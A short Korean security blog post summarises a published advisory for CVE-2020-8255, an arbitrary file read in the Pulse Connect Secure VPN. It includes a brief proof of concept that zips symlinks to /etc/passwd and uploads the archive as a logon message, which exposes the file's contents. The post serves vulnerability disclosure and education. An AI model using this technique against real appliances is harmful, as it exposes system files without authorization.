---
title: "[하루한줄] Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message"
author: L0ch
tags: [L0ch, arbitrary file read, cve]
categories: [1day1line]
date: 2020-10-27 18:00:00
cc: true
index_img: /img/1day1line.png
---

## URL
[Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message (CVE-2020-8255)](https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/)



## Target
Pulse Connect Secure



## Explain
SSL VPN 서비스인 Pulse Connect Secure에서 로그온 메시지 구성 요소를 악용해 arbitrary file read가 가능한 취약점이 발견되었습니다.

관리자는 로그인 시 출력되는 메시지를 `/dana-admin/auth/signinNotf.cgi` 페이지를 통해 설정할 수 있는데, `en.txt` 및 `default.txt` 파일로 구성된 zip 형식의 파일을 업로드하면 해당 파일의 내용이 로그온 메시지로 표시됩니다.

이때 zip 파일에 포함된 파일의 심볼릭 링크 여부를 확인하지 않으며 read 할 파일을 심볼릭 링크로 설정하는 arbitrary file read가 가능합니다.

다음은 `/etc/passwd` 파일을 출력하는 POC입니다.

```
ln -s /etc/passwd default.txt
ln -s /etc/passwd en.txt

zip --symlinks logon.zip default.txt en.txt
adding: default.txt (stored 0%)
adding: en.txt (stored 0%)
```

위와 같이 파일에 심볼릭 링크를 설정해 zip으로 압축한 뒤 `/dana-admin/auth/signinNotf.cgi` 페이지에 업로드하면 로그온 페이지에 `/etc/passwd`의 내용이 표시됩니다.
